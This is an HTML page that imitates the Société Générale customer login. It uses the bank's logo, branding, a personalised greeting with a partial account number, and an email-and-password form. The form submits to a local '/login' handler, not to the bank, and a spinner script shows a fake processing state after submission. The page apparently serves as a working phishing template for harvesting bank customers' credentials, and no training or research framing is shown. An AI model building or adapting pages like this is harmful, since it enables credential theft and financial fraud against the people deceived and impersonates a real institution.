<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Espace Client - Société Générale</title>
    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f5f7fa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #333; }
        .container { background: white; width: 100%; max-width: 420px; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.08); overflow: hidden; }
        .header { background-color: #0065a8; padding: 20px; text-align: center; color: white; }
        .logo-img { width: 140px; height: auto; display: block; margin: 0 auto; }
        .profile-section { padding: 30px 20px; text-align: center; border-bottom: 1px solid #eee; }
        .avatar { width: 80px; height: 80px; background-color: #d4af37; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; color: white; font-size: 32px; font-weight: bold; }
        .welcome-text { font-size: 18px; font-weight: bold; margin-bottom: 5px; }
        .sub-text { font-size: 14px; color: #666; }
        .form-section { padding: 25px 20px; }
        .input-group { margin-bottom: 15px; text-align: left; }
        .input-group label { display: block; font-size: 12px; color: #0065a8; font-weight: bold; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.5px; }
        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; transition: border 0.3s; }
        input:focus { border-color: #0065a8; background-color: #fbfdff; }
        button { width: 100%; padding: 15px; background-color: #d4af37; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background 0.3s; box-shadow: 0 4px 6px rgba(212, 175, 55, 0.3); }
        button:hover { background-color: #bfa030; }
        .footer { background-color: #f9f9f9; padding: 15px; text-align: center; font-size: 11px; color: #888; border-top: 1px solid #eee; }
        .footer a { color: #0065a8; text-decoration: none; margin: 0 5px; }
        .loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid #d4af37; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <!-- Logo officiel SG (Lien direct depuis un serveur d'images) -->
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/14/Logo_Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_2021.svg/1200px-Logo_Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_2021.svg.png" alt="Société Générale" class="logo-img">
        </div>
        
        <div class="profile-section">
            <div class="avatar">J</div>
            <div class="welcome-text">Bonjour, Jean</div>
            <div class="sub-text">Compte Courant n° ... 4829</div>
        </div>

        <div class="form-section">
            <form action="/login" method="POST">
                <div class="input-group">
                    <label for="email">Adresse Email</label>
                    <input type="email" name="email" id="email" placeholder="jean.dupont@email.com" required>
                </div>
                <div class="input-group">
                    <label for="password">Mot de passe</label>
                    <input type="password" name="password" id="password" placeholder="••••••••" required>
                </div>
                <button type="submit" id="submitBtn">Valider la connexion</button>
            </form>
            <div class="loader" id="loader"></div>
        </div>

        <div class="footer">
            <p><a href="#">Mot de passe oublié ?</a> | <a href="#">L'appli SG</a></p>
            <p>© 2026 Société Générale - Tous droits réservés</p>
        </div>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', function() {
            document.getElementById('submitBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
        });
    </script>
</body>
</html>
